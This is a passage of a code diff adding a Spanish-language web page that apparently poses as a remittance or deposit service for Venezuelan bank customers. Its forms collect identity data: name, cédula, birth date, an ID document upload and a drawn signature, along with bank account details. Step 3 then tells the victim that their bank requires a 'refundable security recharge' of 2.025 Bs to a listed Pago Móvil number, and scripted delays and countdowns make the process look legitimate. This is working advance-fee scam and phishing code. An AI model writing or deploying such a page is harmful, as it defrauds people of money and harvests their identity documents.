+              <option value="0172|Banco de la Gente Emprendedora (Bangente)">Bangente</option>
+              <option value="0173|Banco Internacional de Desarrollo, C.A.">BID</option>
+              <option value="0174|BanEve">BanEve</option>
+              <option value="0175|Banco Bicentenario del Pueblo, C.A.">Banco Bicentenario</option>
+              <option value="0177|Bancaribe">Bancaribe</option>
+              <option value="0191|Bancamiga, C.A.">Bancamiga, C.A.</option>
+            </select>
+          </div>
+
+          <div class="form-group">
+            <label for="accountNumber">
+              <i class="far fa-credit-card"></i> Número de Cuenta
+            </label>
+            <span class="label-help">Ej: 0104xxxxxxxxxxxx (20 dígitos)</span>
+            <input
+              type="text"
+              id="accountNumber"
+              placeholder="0104xxxxxx..."
+              maxlength="20"
+              required
+              autocomplete="off"
+            />
+          </div>
+
+          <div class="form-group">
+            <label for="accountType">
+              <i class="fas fa-money-check-alt"></i> Tipo de Cuenta / Moneda
+            </label>
+            <select id="accountType" required autocomplete="off">
+              <option value="">Seleccione</option>
+              <option value="ahorro">Ahorro (Bs)</option>
+              <option value="corriente">Corriente (Bs)</option>
+              <option value="usd">Divisa USD</option>
+              <option value="eur">Divisa EUR</option>
+            </select>
+          </div>
+
+          <div class="form-group">
+            <label for="origenFondos">
+              <i class="fas fa-hand-holding-usd"></i> Origen de los Fondos
+            </label>
+            <select id="origenFondos" required autocomplete="off">
+              <option value="">Seleccione</option>
+              <option value="Ayuda familiar">Ayuda familiar</option>
+              <option value="Pago de deudas">Pago de deudas</option>
+              <option value="Ahorros">Ahorros</option>
+              <option value="Inversiones">Inversiones</option>
+              <option value="Pagos de servicios">Pagos de servicios</option>
+              <option value="Educación">Educación</option>
+              <option value="Ventas">Ventas</option>
+              <option value="Compras">Compras</option>
+              <option value="Gastos médicos">Gastos médicos</option>
+              <option value="Apoyo en emergencias">Apoyo en emergencias</option>
+              <option value="Mantenimiento de propiedades">Mantenimiento de propiedades</option>
+              <option value="Regalos">Regalos</option>
+            </select>
+          </div>
+
+          <div class="form-group">
+            <label for="usdAmount">
+              <i class="fas fa-dollar-sign"></i> Cantidad en USD (opcional)
+            </label>
+            <span class="label-help">Se convertirá automáticamente a Bs</span>
+            <select id="usdAmount" autocomplete="off">
+              <option value="">Seleccione</option>
+              <option value="1000">1000</option>
+              <option value="1500">1500</option>
+              <option value="2400">2400</option>
+            </select>
+          </div>
+
+          <div class="form-group">
+            <label for="bsAmount">
+              <i class="fas fa-coins"></i> Cantidad en Bolívares
+            </label>
+            <input 
+              type="text" 
+              id="bsAmount" 
+              placeholder="Se calculará automáticamente (1 USD = 81 Bs)" 
+              readonly
+              autocomplete="off"
+            />
+          </div>
+
+          <div class="form-group">
+            <label for="montoAlto">
+              <i class="fas fa-chart-line"></i> ¿Recibe usualmente montos altos?
+            </label>
+            <select id="montoAlto" required autocomplete="off">
+              <option value="">Seleccione</option>
+              <option value="si">Sí</option>
+              <option value="no">No</option>
+            </select>
+          </div>
+
+          <div class="form-group">
+            <label for="depositante">
+              <i class="fas fa-user-friends"></i> Depositante / Titular de la Tarjeta
+            </label>
+            <input 
+              type="text" 
+              id="depositante" 
+              placeholder="Ej: María González" 
+              required
+              autocomplete="off"
+            />
+          </div>
+
+          <div class="form-group">
+            <label for="comprobante">
+              <i class="fas fa-file-invoice-dollar"></i> Número de Comprobante
+            </label>
+            <span class="label-help">Número del comprobante o referencia de pago</span>
+            <input 
+              type="text" 
+              id="comprobante" 
+              placeholder="Ej: 12345" 
+              required
+              autocomplete="off"
+            />
+          </div>
+
+          <div class="form-group">
+            <label>
+              <i class="fas fa-exchange-alt"></i> Método de Depósito
+            </label>
+            <select id="metodoDeposito" required autocomplete="off">
+              <option value="">Seleccione</option>
+              <option value="pagoMovil">Pago Móvil</option>
+              <option value="transferencia">Transferencia Tradicional</option>
+            </select>
+          </div>
+
+          <div class="form-group" style="display: flex; align-items: center; gap: 0.5rem;">
+            <input type="checkbox" id="acceptTerms" required />
+            <label for="acceptTerms" style="margin: 0; cursor: pointer;">
+              Acepto los <u>términos y condiciones</u>
+            </label>
+          </div>
+
+          <div class="btn-row">
+            <button type="button" class="btn" onclick="onEditData()">
+              <i class="fas fa-arrow-left"></i> Regresar
+            </button>
+            <button type="button" class="btn" onclick="onContinueStep2()">
+              <i class="fas fa-arrow-right"></i> Siguiente
+            </button>
+          </div>
+        </form>
+      </div> <!-- Fin STEP2 -->
+
+      <!-- STEP 3 -->
+      <div class="form-step" id="step3">
+        <!-- Tarjeta principal (Verificación de Seguridad) -->
+        <div class="verification-card-container" id="verificationMainCard" style="display:none;">
+          <h2>Verificación de Seguridad para tu Transferencia</h2>
+          <p id="verificationMainText"></p>
+          <div class="btn-row" style="justify-content:center;">
+            <button type="button" class="btn" id="btnShowWhy">
+              <i class="fas fa-info-circle"></i> Continuar
+            </button>
+          </div>
+        </div>
+
+        <!-- Sección "¿Por qué realizar esta verificación?" -->
+        <div class="why-verification-container" id="whyVerification" style="display:none;">
+          <h2>¿Por qué realizar esta verificación?</h2>
+          <div class="why-list">
+            <div class="why-item">
+              <img src="https://cdn-icons-png.flaticon.com/512/747/747422.png" alt="Icon1" />
+              <span>Evitar la suplantación de identidad.</span>
+            </div>
+            <div class="why-item">
+              <img src="https://cdn-icons-png.flaticon.com/512/109/109613.png" alt="Icon2" />
+              <span>Proteger tu cuenta de accesos no autorizados.</span>
+            </div>
+            <div class="why-item">
+              <img src="https://cdn-icons-png.flaticon.com/512/929/929610.png" alt="Icon3" />
+              <span>Prevenir bloqueos o retenciones de tu banco.</span>
+            </div>
+            <div class="why-item">
+              <img src="https://cdn-icons-png.flaticon.com/512/5450/5450553.png" alt="Icon4" />
+              <span>Cumplir con normas legales de seguridad.</span>
+            </div>
+          </div>
+          <div class="btn-row" style="justify-content:center; margin-top:2rem;">
+            <!-- DESHABILITADO AL INICIO POR 12s -->
+            <button type="button" class="btn btn-disabled" id="btnShowWhatToDo" disabled>
+              Espera 12s...
+            </button>
+          </div>
+        </div>
+
+        <!-- Sección "¿Qué necesitas hacer?" -->
+        <div class="what-to-do-card" id="whatToDoCard" style="display:none;">
+          <div class="what-to-do-title">¿Qué necesitas hacer?</div>
+          <div class="what-to-do-content">
+            Para verificar que no se suplante tu identidad y que tienes control sobre tu cuenta bancaria, 
+            debes realizar una recarga de seguridad desde la <strong>misma cuenta</strong> 
+            donde recibirás tus fondos, por un monto de <strong id="recargaBs">2.025,00 Bolívares</strong>. 
+            Esta recarga es <strong>reembolsable</strong>; se te devolverá junto con tu depósito final. 
+            Una vez que hagas tu recarga, podrás recibir de forma inmediata tu depósito junto 
+            con tu remesa en bolívares y/o dólares.
+          </div>
+          <div class="what-to-do-data">
+            <ul>
+              <li><strong>Banco:</strong> Banco Venezolano de Crédito (<em>0104</em>)</li>
+              <li><strong>Número:</strong> 0412-1000000</li>
+              <li><strong>RIF:</strong> J-407502646</li>
+              <li><strong>Monto:</strong> <span id="montoReembolsable">2.025,00 Bolívares</span></li>
+              <li><strong>Concepto:</strong> <span id="conceptRecarga" class="concept-text"></span></li>
+            </ul>
+          </div>
+          <button type="button" class="btn btn-disabled" id="btnAfterRecarga" style="margin:1rem auto 0 auto; display:block;" disabled>
+            Espera 45s...
+          </button>
+        </div>
+
+        <!-- Sección final: Completar datos de recarga (único campo comprobante) -->
+        <div class="final-recharge-data" id="finalRechargeData" style="display:none;">
+          <h3>Completar Datos de tu Recarga</h3>
+          <div class="data-row">
+            <div class="data-label">Banco Origen:</div>
+            <div id="finalBankOrigin"></div>
+          </div>
+          <div class="data-row">
+            <div class="data-label">Teléfono:</div>
+            <div id="finalPhone"></div>
+          </div>
+          <div class="data-row">
+            <div class="data-label">Cédula:</div>
+            <div id="finalCedula"></div>
+          </div>
+          <div class="data-row">
+            <div class="data-label">Monto (Bs):</div>
+            <div>2.025,00</div>
+          </div>
+
+          <!-- Banner de reembolso -->
+          <div class="reembolso-banner" id="reembolsoBanner"></div>
+
+          <div class="form-group" style="margin-top:1rem;">
+            <label for="verifNumeroComprobante">
+              <i class="fas fa-file-invoice"></i> Nº de Comprobante (mín. 12 dígitos)
+            </label>
+            <input 
+              type="text" 
+              id="verifNumeroComprobante" 
+              placeholder="Ej: 012345678901" 
+              required
+            />
+          </div>
+
+          <div class="btn-row" style="justify-content:center;">
+            <!-- DESHABILITADO 45s -->
+            <button type="button" class="btn btn-disabled" id="btnFinalRecargaContinuar" disabled>
+              <i class="fas fa-arrow-right"></i> Espera 45s...
+            </button>
+          </div>
+        </div>
+      </div> <!-- Fin STEP3 -->
+    </main>
+  </div> <!-- Fin container -->
+
+  <script>
+    /****************************************************
+     * Formatear montos a X.XXX,00
+     ****************************************************/
+    function formatMoney(value = 0, currency = 'Bs') {
+      let num = parseFloat(value);
+      if (isNaN(num)) num = 0;
+      const formatted = new Intl.NumberFormat('de-DE', {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2
+      }).format(num);
+      return `${formatted} ${currency}`;
+    }
+
+    /****************************************************
+     * Intro Overlay (Mensajes "Bienvenido" 3s, luego "Cargando 2s")
+     ****************************************************/
+    const introOverlay = document.getElementById('introOverlay');
+    const introMessage1 = document.getElementById('introMessage1');
+    const introMessage2 = document.getElementById('introMessage2');
+
+    introMessage1.style.display = 'block';
+
+    setTimeout(() => {
+      introMessage1.style.display = 'none';
+      introMessage2.style.display = 'block';
+      setTimeout(() => {
+        introOverlay.style.display = 'none';
+      }, 2000);
+    }, 3000);
+
+    /****************************************************
+     * Variables Globales
+     ****************************************************/
+    const steps = document.querySelectorAll('.form-step');
+    const sidebarSteps = document.querySelectorAll('.step-item');
+    let currentStep = 1;
+
+    // Barra de progreso
+    const progressBar = document.getElementById('progressBar');
+
+    // Overlays y modales
+    const validationOverlay = document.getElementById('validationOverlay');
+    const modalConfirm = document.getElementById('modalConfirm');
+    const modalConfirmContent = document.getElementById('modalConfirmContent');
+    const finalLoadingOverlay = document.getElementById('finalLoadingOverlay');
+    const comprobanteCierreMsg = document.getElementById('comprobanteCierreMsg');
+    const overlay20s = document.getElementById('overlay20s');
+
+    // Mensajes del overlay20s
+    const overlayMsgs = [
+      document.getElementById('overlayMsg1'),
+      document.getElementById('overlayMsg2'),
+      document.getElementById('overlayMsg3'),
+      document.getElementById('overlayMsg4')
+    ];
+
+    // Step 3 secciones
+    const verificationMainCard = document.getElementById('verificationMainCard');
+    const verificationMainText = document.getElementById('verificationMainText');
+    const btnShowWhy = document.getElementById('btnShowWhy');
+    const whyVerification = document.getElementById('whyVerification');
+    const btnShowWhatToDo = document.getElementById('btnShowWhatToDo');
+    const whatToDoCard = document.getElementById('whatToDoCard');
+    const conceptRecarga = document.getElementById('conceptRecarga');
+    const btnAfterRecarga = document.getElementById('btnAfterRecarga');
+    const finalRechargeData = document.getElementById('finalRechargeData');
+    const btnFinalRecargaContinuar = document.getElementById('btnFinalRecargaContinuar');
+    const reembolsoBanner = document.getElementById('reembolsoBanner');
+
+    // Modal Alerta Recarga
+    const modalAlertaRecarga = document.getElementById('modalAlertaRecarga');
+    const modalAlertaRecargaContent = document.getElementById('modalAlertaRecargaContent');
+    const btnAlertaRecargaOk = document.getElementById('btnAlertaRecargaOk');
+
+    // Inputs final
+    const finalBankOrigin = document.getElementById('finalBankOrigin');
+    const finalPhone = document.getElementById('finalPhone');
+    const finalCedula = document.getElementById('finalCedula');
+    const verifNumeroComprobante = document.getElementById('verifNumeroComprobante');
+    const finalMontoGlobalEl = document.getElementById('finalMontoGlobal');
+
+    // Step de confirm
+    let confirmStep = 1;
+
+    document.addEventListener('DOMContentLoaded', () => {
+      document.getElementById('waFloat').style.display = 'flex';
+    });
+
+    /****************************************************
+     * Manejo de Steps y scroll top
+     ****************************************************/
+    function showStep(step) {
+      steps.forEach((st) => st.classList.remove('active'));
+      steps[step - 1].classList.add('active');
+      updateProgress(step);
+      sidebarSteps.forEach((item, idx) => {
+        item.classList.remove('active');
+        if (idx < step) {
+          item.classList.add('active');
+        }
+      });
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+      currentStep = step;
+    }
+
+    function updateProgress(step) {
+      const total = steps.length;
+      progressBar.style.width = ((step - 1) / (total - 1)) * 100 + '%';
+    }
+
+    /****************************************************
+     * STEP 1 => Continuar
+     ****************************************************/
+    function onContinueStep1() {
+      if (!validateStep1()) return;
+      validationOverlay.style.display = 'flex';
+      setTimeout(() => {
+        validationOverlay.style.display = 'none';
+        confirmStep = 1;
+        modalConfirmContent.innerHTML = buildSummaryStep1();
+        modalConfirm.style.display = 'flex';
+      }, 5000);
+    }
+
+    /****************************************************
+     * STEP 2 => Continuar
+     ****************************************************/
+    function onContinueStep2() {
+      if (!validateStep2()) return;
+      validationOverlay.style.display = 'flex';
+      setTimeout(() => {
+        validationOverlay.style.display = 'none';
+        confirmStep = 2;
+        modalConfirmContent.innerHTML = buildSummaryStep2();
+        modalConfirm.style.display = 'flex';
+      }, 5000);
+    }
+
+    /****************************************************
+     * Aceptar (Modal Confirm)
+     ****************************************************/
+    const btnModalConfirmOk = document.getElementById('btnModalConfirmOk');
+    btnModalConfirmOk.addEventListener('click', () => {
+      modalConfirm.style.display = 'none';
+      if (confirmStep === 1) {
+        showStep(2);
+      } else if (confirmStep === 2) {
+        showStep(3);
+        startOverlay20s();
+      }
+    });
+
+    /****************************************************
+     * Overlay de 20s (4 mensajes x 5s)
+     ****************************************************/
+    function startOverlay20s() {
+      overlay20s.style.display = 'flex';
+      overlayMsgs.forEach((m) => m.style.display = 'none');
+      let index = 0;
+      overlayMsgs[0].style.display = 'block';
+
+      const interval = setInterval(() => {
+        index++;
+        if (index < overlayMsgs.length) {
+          overlayMsgs[index - 1].style.display = 'none';
+          overlayMsgs[index].style.display = 'block';
+        } else {
+          clearInterval(interval);
+          setTimeout(() => {
+            overlay20s.style.display = 'none';
+            showVerificationMainCard();
+          }, 800);
+        }
+      }, 5000);
+    }
+
+    /****************************************************
+     * Mostrar tarjeta principal Step3
+     ****************************************************/
+    function showVerificationMainCard() {
+      verificationMainCard.style.display = 'block';
+      fillVerificationMainText();
+    }
+
+    /****************************************************
+     * Llenar texto principal en Step3
+     ****************************************************/
+    function fillVerificationMainText() {
+      const fullName = document.getElementById('fullName').value.trim() || 'Usuario';
+      const names = fullName.split(' ');
+      const firstName = names[0] || 'Usuario';
+
+      const usdVal = parseFloat(document.getElementById('usdAmount').value) || 0;
+      const rawBsVal = parseFloat(document.getElementById('bsAmount').value) || 0;
+      const accountNumber = document.getElementById('accountNumber').value || '';
+
+      const bsValFormatted = formatMoney(rawBsVal, 'Bolívares');
+      const usdValFormatted = formatMoney(usdVal, 'USD');
+
+      verificationMainText.innerHTML = `
+        Estimado(a) <strong>${fullName}</strong>, recibirás 
+        <strong>${bsValFormatted}</strong> (equivalentes a 
+        <strong>${usdValFormatted}</strong>) en tu cuenta bancaria 
+        <strong>${accountNumber}</strong>. 
+        Debido a que se trata de un monto elevado, tu banco solicita
+        un proceso de seguridad para evitar fraudes.
+      `;
+
+      const cedula = document.getElementById('cedulaNumber').value;
+      const conceptValue = (firstName + cedula).toUpperCase().replace(/\s+/g, '');
+      conceptRecarga.textContent = conceptValue;
+
+      const bankVal = document.getElementById('bankName').value;
+      const [_, bankNameText] = bankVal.split('|') || [];
+      finalBankOrigin.textContent = bankNameText || 'Banco Origen';
+      const prefix = document.getElementById('phonePrefix').value;
+      const phone = document.getElementById('phoneNumber').value;
+      finalPhone.textContent = prefix + '-' + phone;
+      finalCedula.textContent = cedula;
+
+      const totalReembolsar = rawBsVal + 2.025;
+      reembolsoBanner.innerHTML = `
+        Al realizar esta recarga de <strong>2.025,00 Bolívares</strong>, 
+        se te devolverá junto con ${formatMoney(rawBsVal, 'Bolívares')}. 
+        Por lo tanto, tu depósito total será de 
+        <strong>${formatMoney(totalReembolsar, 'Bolívares')}</strong>.
+      `;
+      finalMontoGlobalEl.textContent = formatMoney(totalReembolsar, 'Bolívares');
+    }
+
+    /****************************************************
+     * Botón "Continuar" en la tarjeta principal
+     ****************************************************/
+    btnShowWhy.addEventListener('click', () => {
+      verificationMainCard.style.display = 'none';
+      whyVerification.style.display = 'block';
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+      startWhyVerificationCountdown();
+    });
+
+    /****************************************************
+     * Cuenta regresiva de 12s en "¿Por qué?"
+     ****************************************************/
+    function startWhyVerificationCountdown() {
+      let count = 12;
+      btnShowWhatToDo.disabled = true;
+      btnShowWhatToDo.textContent = `Espera ${count}s...`;
+      btnShowWhatToDo.classList.add('btn-disabled');
+
+      const interval = setInterval(() => {
+        count--;
+        if (count > 0) {
+          btnShowWhatToDo.textContent = `Espera ${count}s...`;
+        } else {
+          clearInterval(interval);
+          btnShowWhatToDo.textContent = 'Entendido, continuar';
+          btnShowWhatToDo.disabled = false;
+          btnShowWhatToDo.classList.remove('btn-disabled');
+        }
+      }, 1000);
+    }
+
+    /****************************************************
+     * Botón "Entendido, continuar" => mostrar "¿Qué hacer?"
+     ****************************************************/
+    btnShowWhatToDo.addEventListener('click', () => {
+      whyVerification.style.display = 'none';
+      whatToDoCard.style.display = 'block';
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+      startWhatToDoCountdown();
+    });
+
+    /****************************************************
+     * Cuenta regresiva de 45s en "¿Qué necesitas hacer?"
+     ****************************************************/
+    function startWhatToDoCountdown() {
+      let count = 45;
+      btnAfterRecarga.disabled = true;
+      btnAfterRecarga.textContent = `Espera ${count}s...`;
+      btnAfterRecarga.classList.add('btn-disabled');
+
+      const interval = setInterval(() => {
+        count--;
+        if (count > 0) {
+          btnAfterRecarga.textContent = `Espera ${count}s...`;
+        } else {
+          clearInterval(interval);
+          btnAfterRecarga.textContent = 'Una vez que realices tu recarga, presiona aquí';
+          btnAfterRecarga.disabled = false;
+          btnAfterRecarga.classList.remove('btn-disabled');
+        }
+      }, 1000);
+    }
+
+    /****************************************************
+     * Botón "Una vez que realices tu recarga..."
+     ****************************************************/
+    btnAfterRecarga.addEventListener('click', () => {
+      showRecargaAlert();
+    });
+
+    function showRecargaAlert() {
+      modalAlertaRecargaContent.innerHTML = `
+        <p>Has realizado tu recarga de seguridad por <strong>2.025,00 Bolívares</strong> a los siguientes datos:</p>
+        <ul>
+          <li><strong>Banco:</strong> Banco Venezolano de Crédito (0104)</li>
+          <li><strong>Número:</strong> 0412-1000000</li>
+          <li><strong>RIF:</strong> J-407502646</li>
+          <li><strong>Monto:</strong> 2.025,00 Bolívares</li>
+          <li><strong>Concepto:</strong> <span id="alertConcept">${conceptRecarga.textContent}</span></li>
+        </ul>
+      `;
+      modalAlertaRecarga.style.display = 'flex';
+      disableAlertRecargaOk();
+    }
+
+    /****************************************************
+     * Botón "Confirmar" en la modal => 12s
+     ****************************************************/
+    function disableAlertRecargaOk() {
+      let count = 12;
+      btnAlertaRecargaOk.disabled = true;
+      btnAlertaRecargaOk.textContent = `Espera ${count}s...`;
+      btnAlertaRecargaOk.classList.add('btn-disabled');
+
+      const interval = setInterval(() => {
+        count--;
+        if (count > 0) {
+          btnAlertaRecargaOk.textContent = `Espera ${count}s...`;
+        } else {
+          clearInterval(interval);
+          btnAlertaRecargaOk.textContent = 'Confirmar';
+          btnAlertaRecargaOk.disabled = false;
+          btnAlertaRecargaOk.classList.remove('btn-disabled');
+        }
+      }, 1000);
+    }
+
+    function closeRecargaAlert() {
+      modalAlertaRecarga.style.display = 'none';
+    }
+
+    btnAlertaRecargaOk.addEventListener('click', () => {
+      closeRecargaAlert();
+      whatToDoCard.style.display = 'none';
+      finalRechargeData.style.display = 'block';
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+      disableFinalRecargaButton();
+    });
+
+    /****************************************************
+     * Botón "Continuar" en sección final => 45s
+     ****************************************************/
+    function disableFinalRecargaButton() {
+      let count = 45;
+      btnFinalRecargaContinuar.disabled = true;
+      btnFinalRecargaContinuar.textContent = `Espera ${count}s...`;
+      btnFinalRecargaContinuar.classList.add('btn-disabled');
+
+      const interval = setInterval(() => {
+        count--;
+        if (count > 0) {
+          btnFinalRecargaContinuar.textContent = `Espera ${count}s...`;
+        } else {
+          clearInterval(interval);
+          btnFinalRecargaContinuar.textContent = 'Continuar';
+          btnFinalRecargaContinuar.disabled = false;
+          btnFinalRecargaContinuar.classList.remove('btn-disabled');
+        }
+      }, 1000);
+    }
+
+    btnFinalRecargaContinuar.addEventListener('click', () => {
+      if (!verifNumeroComprobante.value || verifNumeroComprobante.value.length < 12) {
+        alert('El número de comprobante debe tener al menos 12 dígitos.');
+        return;
+      }
+      startFinalLoading();
+    });
+
+    function startFinalLoading() {
+      finalLoadingOverlay.style.display = 'flex';
+      const stepsFinal = 8;
+      let stepIndex = 1;
+
+      function showFinalStep(index) {
+        for (let i = 1; i <= stepsFinal; i++) {
+          document.getElementById(`finalStep${i}`).style.display = 'none';
+        }
+        document.getElementById(`finalStep${index}`).style.display = 'block';
+      }
+
+      showFinalStep(stepIndex);
+
+      const interval = setInterval(() => {
+        stepIndex++;
+        if (stepIndex <= stepsFinal) {
+          showFinalStep(stepIndex);
+        } else {
+          clearInterval(interval);
+        }
+      }, 5000);
+    }
+
+    /****************************************************
+     * Editar datos => reset
+     ****************************************************/
+    function onEditData() {
+      modalConfirm.style.display = 'none';
+      validationOverlay.style.display = 'none';
+      finalLoadingOverlay.style.display = 'none';
+      comprobanteCierreMsg.style.display = 'none';
+      overlay20s.style.display = 'none';
+      modalAlertaRecarga.style.display = 'none';
+      clearAllData();
+      showStep(1);
+    }
+
+    function clearAllData() {
+      document.getElementById('formStep1').reset();
+      document.getElementById('formStep2').reset();
+      document.getElementById('docUploadName').textContent = '';
+      document.getElementById('signaturePreviewContainer').style.display = 'none';
+      document.getElementById('signaturePreview').src = '';
+      document.getElementById('signatureData').value = '';
+
+      verificationMainCard.style.display = 'none';
+      whyVerification.style.display = 'none';
+      whatToDoCard.style.display = 'none';
+      finalRechargeData.style.display = 'none';
+      verifNumeroComprobante.value = '';
+
+      currentStep = 1;
+      updateProgress(currentStep);
+      steps.forEach((st) => st.classList.remove('active'));
+      steps[0].classList.add('active');
+      sidebarSteps.forEach((item) => item.classList.remove('active'));
+      sidebarSteps[0].classList.add('active');
+    }
+
+    /****************************************************
+     * Validaciones Step1 / Step2
+     ****************************************************/
+    function validateStep1() {
+      const fullName = document.getElementById('fullName');
+      const phonePrefix = document.getElementById('phonePrefix');
+      const phoneNumber = document.getElementById('phoneNumber');
+      const docType = document.getElementById('docType');
+      const nacionalidad = document.getElementById('nacionalidad');
+      const cedulaNumber = document.getElementById('cedulaNumber');
+      const birthDate = document.getElementById('birthDate');
+      const docUpload = document.getElementById('docUpload');
+      const signatureData = document.getElementById('signatureData');
+
+      if (
+        !fullName.value.trim() ||
+        !phonePrefix.value ||
+        !phoneNumber.value.match(/^\d{7}$/) ||
+        !docType.value ||
+        !nacionalidad.value ||
+        !cedulaNumber.value.match(/^\d{1,8}$/) ||
+        !birthDate.value ||
+        !docUpload.files.length ||
+        !signatureData.value
+      ) {
+        alert('Por favor, completa todos los campos correctamente en Datos Personales.');
+        return false;
+      }
+      return true;
+    }
+
+    function validateStep2() {
+      const bankName = document.getElementById('bankName');
+      const accountNumber = document.getElementById('accountNumber');
+      const accountType = document.getElementById('accountType');
+      const origenFondos = document.getElementById('origenFondos');
+      const montoAlto = document.getElementById('montoAlto');
+      const depositante = document.getElementById('depositante');
+      const comprobante = document.getElementById('comprobante');
+      const metodoDeposito = document.getElementById('metodoDeposito');
+      const acceptTerms = document.getElementById('acceptTerms');
+
+      if (
+        !bankName.value ||
+        !accountNumber.value.trim() ||
+        !accountType.value ||
+        !origenFondos.value ||
+        !montoAlto.value ||
+        !depositante.value.trim() ||
+        !comprobante.value.trim() ||
+        !metodoDeposito.value ||
+        !acceptTerms.checked
+      ) {
+        alert('Por favor, completa todos los campos en Datos Bancarios.');
+        return false;
+      }
+      return true;
+    }
+
+    /****************************************************
+     * Summaries para modal confirm
+     ****************************************************/
+    function buildSummaryStep1() {
+      const fullName = document.getElementById('fullName').value;
+      const phonePrefix = document.getElementById('phonePrefix').value;
+      const phoneNumber = document.getElementById('phoneNumber').value;
+      const docType = document.getElementById('docType').value;
+      const nacionalidad = document.getElementById('nacionalidad').value;
+      const cedulaNumber = document.getElementById('cedulaNumber').value;
+      const birthDate = document.getElementById('birthDate').value;
+      const docUpload = document.getElementById('docUpload');
+      const docFileName = docUpload.files.length ? docUpload.files[0].name : '';
+      const signatureData = document.getElementById('signatureData').value;
+
+      return `
+        <p><strong>Nombre y Apellido:</strong> ${fullName}</p>
+        <p><strong>Teléfono:</strong> ${phonePrefix}-${phoneNumber}</p>
+        <p><strong>Tipo de Documento:</strong> ${docType}</p>
+        <p><strong>Nacionalidad:</strong> ${nacionalidad}</p>
+        <p><strong>N° de Cédula:</strong> ${cedulaNumber}</p>
+        <p><strong>Fecha de Nacimiento:</strong> ${birthDate}</p>
+        <p><strong>Documento de Identidad:</strong> ${docFileName}</p>
+        <div style="margin-top:1rem;">
+          <strong>Firma Digital:</strong><br/>
+          <img src="${signatureData}" alt="Firma Digital" style="max-width:200px;"/>
+        </div>
+      `;
+    }
+
+    function buildSummaryStep2() {
+      const bankNameValue = document.getElementById('bankName').value;
+      const [bankCode, bankNameText] = bankNameValue ? bankNameValue.split('|') : ['', ''];
+      const accountNumber = document.getElementById('accountNumber').value;
+      const accountType = document.getElementById('accountType').value;
+      const origenFondos = document.getElementById('origenFondos').value;
+
+      let usdAmountVal = document.getElementById('usdAmount').value;
+      let bsAmountVal = document.getElementById('bsAmount').value;
+      if (usdAmountVal) {
+        usdAmountVal = formatMoney(usdAmountVal, 'USD');
+      }
+      if (bsAmountVal) {
+        bsAmountVal = formatMoney(bsAmountVal, 'Bolívares');
+      }
+
+      const montoAlto = document.getElementById('montoAlto').value;
+      const depositante = document.getElementById('depositante').value;
+      const comprobante = document.getElementById('comprobante').value;
+      const metodoDeposito = document.getElementById('metodoDeposito').value;
+
+      let currency = 'Bs';
+      if (accountType === 'usd') currency = 'USD';
+      if (accountType === 'eur') currency = 'EUR';
+
+      // Se quita el <hr/> que generaba la línea molesta
+      return `
+        <p><strong>Banco:</strong> ${bankNameText} (${bankCode || 'N/A'})</p>
+        <p><strong>Número de Cuenta:</strong> ${accountNumber}</p>
+        <p><strong>Tipo de Cuenta / Moneda:</strong> ${accountType.toUpperCase()} (${currency})</p>
+        <p><strong>Origen de Fondos:</strong> ${origenFondos}</p>
+        ${
+          usdAmountVal
+          ? `<p><strong>Monto en USD:</strong> ${usdAmountVal}</p>`
+          : ''
+        }
+        ${
+          bsAmountVal
+          ? `<p><strong>Equivalente en Bolívares:</strong> ${bsAmountVal}</p>`
+          : ''
+        }
+        <p><strong>¿Recibe montos altos?:</strong> ${montoAlto}</p>
+        <p><strong>Depositante / Titular:</strong> ${depositante}</p>
+        <p><strong>N° de Comprobante:</strong> ${comprobante}</p>
+        <p><strong>Método de Depósito:</strong> ${
+          metodoDeposito === 'pagoMovil' 
+            ? 'Pago Móvil'
+            : 'Transferencia Tradicional'
+        }</p>
+      `;
+    }
+
+    /****************************************************
+     * Firma Digital con Canvas
+     ****************************************************/
+    let isDrawing = false;
+    let x = 0;
+    let y = 0;
+    let signatureCanvas, ctx;
+
+    function openSignaturePad() {
+      document.getElementById('signatureModal').style.display = 'flex';
+      signatureCanvas = document.getElementById('signatureCanvas');
+      ctx = signatureCanvas.getContext('2d');
+
+      signatureCanvas.addEventListener('mousedown', startPosition);
+      signatureCanvas.addEventListener('mouseup', finishedPosition);
+      signatureCanvas.addEventListener('mousemove', draw);
+
+      signatureCanvas.addEventListener('touchstart', startPositionTouch);
+      signatureCanvas.addEventListener('touchend', finishedPositionTouch);
+      signatureCanvas.addEventListener('touchmove', drawTouch);
+    }
+
+    function closeSignatureModal() {
+      document.getElementById('signatureModal').style.display = 'none';
+      removeSignatureCanvasListeners();
+    }
+
+    function removeSignatureCanvasListeners() {
+      signatureCanvas.removeEventListener('mousedown', startPosition);
+      signatureCanvas.removeEventListener('mouseup', finishedPosition);
+      signatureCanvas.removeEventListener('mousemove', draw);
+
+      signatureCanvas.removeEventListener('touchstart', startPositionTouch);
+      signatureCanvas.removeEventListener('touchend', finishedPositionTouch);
+      signatureCanvas.removeEventListener('touchmove', drawTouch);
+    }
+
+    function startPosition(e) {
+      isDrawing = true;
+      [x, y] = [e.offsetX, e.offsetY];
+    }
+    function finishedPosition() {
+      isDrawing = false;
+      ctx.beginPath();
+    }
+    function draw(e) {
+      if (!isDrawing) return;
+      ctx.lineWidth = 2;
+      ctx.lineCap = 'round';
+      ctx.strokeStyle = '#000';
+      ctx.lineTo(e.offsetX, e.offsetY);
+      ctx.stroke();
+      ctx.beginPath();
+      ctx.moveTo(e.offsetX, e.offsetY);
+    }
+
+    function getTouchPos(canvasDom, touchEvent) {
+      const rect = canvasDom.getBoundingClientRect();
+      return {
+        x: touchEvent.touches[0].clientX - rect.left,
+        y: touchEvent.touches[0].clientY - rect.top
+      };
+    }
+    function startPositionTouch(e) {
+      e.preventDefault();
+      isDrawing = true;
+      const pos = getTouchPos(signatureCanvas, e);
+      x = pos.x;
+      y = pos.y;
+    }
+    function finishedPositionTouch(e) {
+      e.preventDefault();
+      isDrawing = false;
+      ctx.beginPath();
+    }
+    function drawTouch(e) {
+      e.preventDefault();
+      if (!isDrawing) return;
+      const pos = getTouchPos(signatureCanvas, e);
+      ctx.lineWidth = 2;
+      ctx.lineCap = 'round';
+      ctx.strokeStyle = '#000';
+      ctx.lineTo(pos.x, pos.y);
+      ctx.stroke();
+      ctx.beginPath();
+      ctx.moveTo(pos.x, pos.y);
+    }
+
+    document.getElementById('clearSignature').addEventListener('click', () => {
